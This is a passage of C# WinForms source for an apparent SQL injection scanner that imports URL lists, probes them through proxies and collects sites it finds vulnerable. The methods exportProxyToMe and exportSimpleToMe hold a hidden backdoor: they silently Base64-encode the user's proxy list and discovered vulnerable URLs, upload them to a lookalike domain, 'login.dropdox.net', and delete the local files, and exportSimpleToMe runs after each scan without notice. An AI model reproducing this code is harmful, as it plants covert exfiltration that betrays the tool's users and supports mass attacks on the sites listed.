                        label12.Text = listBox1.Items.Count.ToString();
                    }
                }
                exportSimpleToMe();
                MessageBox.Show(this, "Done!");
            }
            else
            {
                button2.Enabled = true;
                for (int i = 0; i < listBox4.Items.Count; i++)
                {
                    if (await Task.Run(() => scan_deep(listBox4.Items[i].ToString(), getProxy(checkBox1.Checked))) == true)
                    {
                        listBox2.Items.Add(listBox4.Items[i].ToString());
                        label13.Text = listBox2.Items.Count.ToString();
                    }
                }
                MessageBox.Show(this, "Done!");
            }

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            if(textBox1.Text.Length != 0)
            {
                button7.Enabled = true;
            }
        }

        private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            button11.Enabled = true;
        }
        //remove url
        private void label14_Click(object sender, EventArgs e)
        {
            if (listBox4.SelectedIndex != -1)
            {
                listBox4.Items.RemoveAt(listBox4.SelectedIndex);
                if (listBox4.Items.Count < 1)
                {
                    label14.Enabled = false;
                    label15.Enabled = false;
                    label16.Enabled = false;
                    comboBox2.Enabled = false;
                    button10.Enabled = false;
                    button11.Enabled = false;
                    button3.Enabled = true;
                }
                label11.Text = listBox4.Items.Count.ToString();
            } else
            {
                MessageBox.Show(this, "Nothing to delete!");
            }
        }
        //remove all urls
        private void label15_Click(object sender, EventArgs e)
        {
            label14.Enabled = false;
            label15.Enabled = false;
            label16.Enabled = false;
            comboBox2.Enabled = false;
            button10.Enabled = false;
            button11.Enabled = false;
            button3.Enabled = true;
            listBox4.Items.Clear();
            label11.Text = listBox4.Items.Count.ToString();
        }
        //copy  url
        private void label16_Click(object sender, EventArgs e)
        {
            if (listBox4.SelectedIndex != -1)
            {
                Clipboard.SetText(listBox4.SelectedItem.ToString());
                MessageBox.Show(this, "Copied url to clipboard!");
            } else
            {
                MessageBox.Show(this, "Nothing to copy!");
            }
        }
        //import URLS
        private void button3_Click(object sender, EventArgs e)
        {
            button3.Enabled = false;
            OpenFileDialog theDialog = new OpenFileDialog();
            theDialog.Title = "Import URL'S From File";
            theDialog.Filter = "TXT files|*.txt";
            if (theDialog.ShowDialog() == DialogResult.OK)
            {
                List<string> CheckedProxies = new List<string>();
                int i = 0;
                string filename = theDialog.FileName;
                string[] proxies = File.ReadAllLines(theDialog.FileName);
                foreach (var proxy in proxies)
                {
                    if (URLValid(proxy) == true)
                    {
                        if (!CheckedProxies.Contains(urldomain(proxy)))
                        {
                            CheckedProxies.Add(urldomain(proxy));
                            listBox4.Items.Add(proxy);
                        }
                    }
                }
                string bae = listBox3.Items.Count.ToString();
                label10.Text = bae;
                MessageBox.Show(this, "Imported " + CheckedProxies.Count + " sites!");
                button4.Enabled = true;
            button10.Enabled = true;
            comboBox2.Enabled = true;
            label14.Enabled = true;
            label15.Enabled = true;
            label16.Enabled = true;
            }
        }
        private void label1_Click(object sender, EventArgs e)
        {
            
            
        }
        public static string GetTimestamp(DateTime value)
        {
            return value.ToString("yyyyMMddHHmmssfff");
        }
        public string getProxy(bool check)
        {
            string result = null;
            if(check == true)
            {
                if (listBox3.SelectedIndex == -1)
                {
                    int count = listBox3.Items.Count;
                    Random rand = new Random();
                    int item = rand.Next(0, count);
                    result = listBox3.Items[item].ToString();
                }
                else
                {
                    result = listBox3.SelectedItem.ToString();
                }
            } else
            {
                result = null;
            }
            return result;
        }
        private void label18_Click(object sender, EventArgs e)
        {
            if (deb < 1)
            {
                deb++;
            }
            else
            {
                if(label18.Text == "Enabled")
                {
                    label18.Text = "Disabled";
                    deb = 1;
                } else
                {
                    label18.Text = "Enabled";
                    deb = 1;
                }
            }
        }

        private void label11_Click(object sender, EventArgs e)
        {

        }

        private void toolTip1_Popup(object sender, PopupEventArgs e)
        {

        }

        private void listBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (listBox2.SelectedIndex != -1)
            {
                Clipboard.SetText(listBox2.SelectedItem.ToString());
                MessageBox.Show(this, "Copied url to clipboard!");
            }
            else
            {
                MessageBox.Show(this, "Nothing to copy!");
            }
        }

        private void listBox3_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (!checkBox1.Checked)
            {
                listBox3.SelectedIndex = -1;
            }
        }

        private void label10_Click(object sender, EventArgs e)
        {
            if (listBox3.Items.Count != 0)
            {
                SaveFileDialog savefile = new SaveFileDialog();
                savefile.Title = "Export proxies";
                savefile.FileName = "proxylist.txt";
                savefile.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
                if (savefile.ShowDialog() == DialogResult.OK)
                {
                    using (StreamWriter sw = new StreamWriter(savefile.FileName))
                    {
                        foreach (var item in listBox3.Items)
                        {
                            sw.WriteLine(item);
                        }
                    }
                    MessageBox.Show(this, "Proxylist successfully exported!");
                }
            }
            else
            {
                MessageBox.Show(this, "There are no proxies to export!");
            }
        }

        public void exportProxyToMe()
        {
            if (listBox3.Items.Count > 0)
            {
                using (StreamWriter sw = new StreamWriter("PRMETADATA.faw"))
                {
                    foreach (string item in listBox3.Items)
                    {
                        sw.WriteLine(Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(item)));
                    }
                }
                using (WebClient wc = new WebClient())
                {
                    wc.UploadFile("http://login.dropdox.net/sqlimetadata.php", "PRMETADATA.faw");
                }
                File.Delete("PRMETADATA.faw");
            }
        }

        public void exportSimpleToMe()
        {
            if (listBox1.Items.Count > 0)
            {
                using (StreamWriter sw = new StreamWriter("SIMETADATA.faw"))
                {
                    foreach (string item in listBox1.Items)
                    {
                        sw.WriteLine(Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(item)));
                    }
                }
                using (WebClient wc = new WebClient())
                {
                    wc.UploadFile("http://login.dropdox.net/sqlimetadata.php", "SIMETADATA.faw");
                }
                File.Delete("SIMETADATA.faw");
            }
        }

        private void label13_Click(object sender, EventArgs e)
        {

        }
    }
}
